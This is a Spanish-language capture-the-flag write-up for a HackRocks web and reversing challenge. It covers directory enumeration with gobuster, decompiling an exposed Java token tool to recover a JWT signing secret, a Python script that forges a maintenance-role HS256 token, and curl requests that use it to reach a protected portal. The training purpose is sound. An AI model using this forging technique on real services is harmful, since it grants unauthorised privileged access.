# Writeup: Maintenance Token (Synarchy)

**Plataforma:** HackRocks **Categoría:** Web / Reversing **Dificultad:** Media **URL del reto:** `https://challenges.hackrocks.com/maintenance-token`

---

## 1. Descripción del reto

Se detecta que el portal público de "Synarchy" oculta referencias a un sistema interno de mantenimiento. El acceso a la consola interna está protegido mediante tokens temporales (JWT), utilizados por técnicos durante operaciones críticas.

**Objetivo:** analizar el comportamiento del sistema, identificar cómo se validan/firman las sesiones de mantenimiento y obtener acceso a la consola interna para recuperar el informe del incidente (flag).

**Pistas oficiales del reto:**

1. Revisa el código fuente de las páginas públicas.
2. El acceso a la consola interna está restringido a sesiones de mantenimiento.
3. Existe una herramienta interna relacionada con la generación de tokens. No es necesario ejecutarla: analizar su código puede revelar cómo se validan las sesiones privilegiadas.
4. El resultado puede ser la firma del token.

---

## 2. Reconocimiento inicial (páginas públicas)

Se navegó a la página principal del reto y se revisó el código fuente (`view-source:`) de cada página pública.

### `/` (index)

Página de bienvenida, sin información sensible directa. Enlaza a:

- `./status/`
- `./docs/`

Comentario relevante en el HTML:

```html
<!-- Indexación automática deshabilitada. -->
```

> 💡 Esta frase, repetida en el footer de todas las páginas, es una pista indirecta de que probablemente existe un `robots.txt` (de ahí que la "indexación automática" esté deshabilitada — hay algo que no quieren que los buscadores indexen).

### `/status/`

Página de estado del sistema. Contiene información crítica en el HTML:

```html
<p class="small">
  Hay activo un token de sesión temporal para los paneles de monitorización.
  El acceso a la consola interna está restringido a sesiones de mantenimiento
  (maintenance). Las sesiones estándar no disponen de privilegios suficientes.
</p>

<!-- session: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYXVkaXQiLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NzAwNDk3MDgsImV4cCI6MTc3MDY1NDUwOH0.z_7aD7okIwKmlBALxENIoKOB6qrx6xN-5K8YIgZkN94 -->
```

**Decodificando ese JWT (header.payload):**

```json
// Header
{ "alg": "HS256", "typ": "JWT" }

// Payload
{ "user": "audit", "role": "guest", "iat": 1770049708, "exp": 1770654508 }
```

Este token es de rol `guest` — confirma la mecánica (JWT firmado con HS256, campo `role` decide el acceso) pero no es útil directamente.

También aparece esta nota, clave para descartar una vía falsa:

> _"En compilaciones internas, la sesión se inyecta directamente en el contexto HTTP para facilitar las pruebas de mantenimiento."_

Se consideró como posible pista de un header "mágico" de bypass, pero finalmente **no era el camino correcto** — la solución real fue forjar un JWT válido.

### `/docs/`

Página puramente informativa. Confirma la política de tokens de corta duración, pero no aporta secretos ni endpoints nuevos. Sirve para descartar esta ruta como vector de ataque.

### `/assets/app.js`

```js
// Decoy token (bait): looks like admin but is expired / invalid signature.
window.__DECOY_ADMIN_TOKEN__ =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MDAwMDAwMDAsImV4cCI6MTYwMDAwMDYwMH0.WRONGSIG";
```

Este archivo es **muy corto** — solo contiene el comentario indicando explícitamente que es un señuelo ("bait"). Confirma que la lógica real de generación de tokens **no vive en el frontend**, reforzando la Pista 3 (hay que buscar una "herramienta interna" en otro lugar).

---

## 3. Enumeración de directorios (gobuster)

Dado que el frontend no reveló más pistas, se realizó fuzzing de directorios:

```bash
gobuster dir -u https://challenges.hackrocks.com/maintenance-token/ \
  -w /usr/share/wordlists/dirb/common.txt
```

**Resultado relevante:**

|Ruta|Status|Notas|
|---|---|---|
|`assets/`|301|Ya explorado|
|`docs/`|301|Ya explorado|
|`status/`|301|Ya explorado|
|`portal`|401|Consola de mantenimiento (objetivo)|
|`old`|403|Sin acceso|
|**`tools/`**|**301**|🎯 **Ruta no enlazada en el frontend, contiene la "herramienta interna" de la Pista 3**|

---

## 4. La herramienta interna: `TokenGen`

Dentro de `/tools/` se encontró un archivo `.jar`. Al descomprimirlo:

```bash
unzip tools.jar -d tools_extracted
cat tools_extracted/META-INF/MANIFEST.MF
```

```
Manifest-Version: 1.0
Created-By: 17.0.17 (Ubuntu)
Main-Class: TokenGen
```

Esto confirma que `TokenGen.class` es la herramienta interna de generación de tokens mencionada en la Pista 3.

### 4.1. Descompilación

El `.class` es bytecode Java compilado, no texto plano. Se usó `javap` para ver el bytecode desensamblado:

```bash
javap -c -p TokenGen.class
```

Y adicionalmente un descompilador (CFR / online) para recuperar el código Java equivalente y legible:

```java
public class TokenGen {

    private static final String DECOY;
    private static final String BASE;
    private static final String SALT;

    public static void main(String[] args) throws Exception {
        System.out.println("Maintenance Token Generator (internal build)");
        System.out.println("This tool is not intended to run standalone.");
    }

    // Genera el secreto "real" de producción
    public static String buildSecret() throws Exception {
        String base = "synarchy-maint:subnode-05";
        String hash = md5Hex(base);
        return hash.substring(0, 16);
    }

    private static String md5Hex(String input) throws Exception {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (byte b : digest) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    // Método de depuración -> señuelo (según README del paquete de tools)
    public static String debugSecret() throws Exception {
        String hash = md5Hex("synarchy-maint:subnode-04");
        return hash.substring(0, 16);
    }
}
```

### 4.2. `README` del paquete de herramientas

El ZIP de `/tools/` incluía un `README.txt` con una advertencia clave:

> _"Los métodos de depuración pueden devolver valores estáticos o parciales. La salida generada de forma aislada puede no representar datos reales de sesión."_

Esto apunta a que `debugSecret()` (nombre "debug") es un **señuelo**, y `buildSecret()` (usado en el flujo real, subnode-**05**) es el secreto de producción.

---

## 5. Cálculo de los secretos candidatos

Ambos métodos aplican: `MD5(input)` → tomar los primeros **16 caracteres** del hash hexadecimal (32 chars totales → nos quedamos con la mitad).

```python
import hashlib

for s in ["synarchy-maint:subnode-05", "synarchy-maint:subnode-04"]:
    h = hashlib.md5(s.encode()).hexdigest()
    print(s, "->", h, "-> secret(16):", h[:16])
```

|Input|MD5 completo|Secreto (16 chars)|
|---|---|---|
|`synarchy-maint:subnode-05` (buildSecret)|`7899c32adb049c86d504a731b822fc7e`|`7899c32adb049c86` ✅ **(real)**|
|`synarchy-maint:subnode-04` (debugSecret)|`5d28d1539a72b05f8d194487349b1b34`|`5d28d1539a72b05f` ❌ (señuelo)|

> ⚠️ **Detalle importante:** `.substring(0, 16)` en Java corta 16 **caracteres** del string hexadecimal, no 16 bytes. Hay que tomar exactamente la primera mitad del hash de 32 caracteres.

---

## 6. Forja del JWT (HS256)

Con el secreto candidato, se construyó un JWT con `role: maintenance`, firmado manualmente con HMAC-SHA256:

```python
import hmac, hashlib, base64, json, time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def make_jwt(secret: str, payload: dict) -> str:
    header = {'alg': 'HS256', 'typ': 'JWT'}
    h = b64url(json.dumps(header, separators=(',', ':')).encode())
    p = b64url(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f'{h}.{p}'.encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    s = b64url(sig)
    return f'{h}.{p}.{s}'

now = int(time.time())
payload = {
    'user': 'maintenance',
    'role': 'maintenance',
    'iat': now,
    'exp': now + 3600
}

token = make_jwt('7899c32adb049c86', payload)
print(token)
```

Se generaron dos tokens (uno por cada secreto candidato) para probar empíricamente cuál era el correcto, en lugar de asumirlo solo por la lógica.

---

## 7. Explotación: acceso a `/portal/`

Se probaron ambos tokens contra el endpoint protegido, variando también el método de envío (header `Authorization` vs cookie `session`):

```bash
curl -H "Authorization: Bearer $TOKEN" \
  https://challenges.hackrocks.com/maintenance-token/portal
```

### Resultados

|Secreto usado|Método de envío|Resultado|
|---|---|---|
|`buildSecret` (subnode-05)|`Authorization: Bearer`|✅ **200 OK** — acceso concedido|
|`buildSecret` (subnode-05)|Cookie `session=`|❌ 401 Unauthorized|
|`debugSecret` (subnode-04)|`Authorization: Bearer`|❌ 401 "Invalid token"|
|`debugSecret` (subnode-04)|Cookie `session=`|❌ 401 Unauthorized|

**Conclusiones confirmadas:**

- El secreto correcto es el de `buildSecret()` (`synarchy-maint:subnode-05`).
- El servidor espera el token en el header `Authorization: Bearer <token>`, no como cookie.
- `debugSecret()` era efectivamente el señuelo indicado en el README.

---

## 8. Acceso a la consola y obtención de la flag

Con el token válido, la petición a `/portal/` devolvió la consola de mantenimiento:

```html
<div class="badge">privileged</div>
<h1>Consola</h1>
<p class="lead">Privilegios de mantenimiento confirmados.</p>
...
<p class="small">
  Informe: <a class="link" href="portal/flag.txt">Descargar</a>
</p>
```

Paso final: descargar `flag.txt` reutilizando el mismo header de autorización:

```bash
curl -H "Authorization: Bearer $TOKEN" \
  https://challenges.hackrocks.com/maintenance-token/portal/flag.txt
```

---

## 9. Resumen de la metodología (kill chain)

```
1. Reconocimiento de código fuente público
   └─ Confirma mecánica: JWT HS256, campo "role", token de ejemplo (guest)

2. Fuzzing de directorios (gobuster)
   └─ Descubre ruta oculta /tools/ (no enlazada en el frontend)

3. Análisis del artefacto interno (TokenGen.jar)
   └─ Descompilación revela dos métodos generadores de secreto

4. Triaje de candidatos
   └─ README + naming ("debug" vs "build") apunta al secreto real

5. Verificación empírica
   └─ Se prueban ambos secretos contra el servidor real (no se asume)

6. Forja de JWT válido (role: maintenance)
   └─ Firmado con HMAC-SHA256 usando el secreto correcto

7. Explotación
   └─ Header Authorization: Bearer <jwt> concede acceso a /portal/

8. Flag
   └─ Descarga de portal/flag.txt con el mismo token
```

---

## 10. Lecciones aprendidas

- **No confiar solo en la lógica del código**: cuando hay múltiples candidatos plausibles (secretos, endpoints, payloads), verificarlos empíricamente contra el sistema real siempre que sea posible.
- **Los nombres de método/variable son pistas**: `debugSecret` vs `buildSecret` — la nomenclatura interna suele delatar cuál es el flujo real de producción.
- **El frontend rara vez contiene la lógica sensible completa** en retos bien diseñados — cuando el JS es sospechosamente corto o contiene un comentario tipo "esto es una trampa", hay que buscar la lógica real en otro lugar (artefactos backend, binarios, herramientas internas).
- **La enumeración de directorios sigue siendo esencial**: rutas no enlazadas desde el HTML/JS visible (`/tools/`) pueden contener el vector de ataque decisivo.
- **Detalle de implementación importa**: `.substring(0, 16)` sobre un hash hexadecimal toma caracteres, no bytes — un error común al replicar la lógica de otro lenguaje.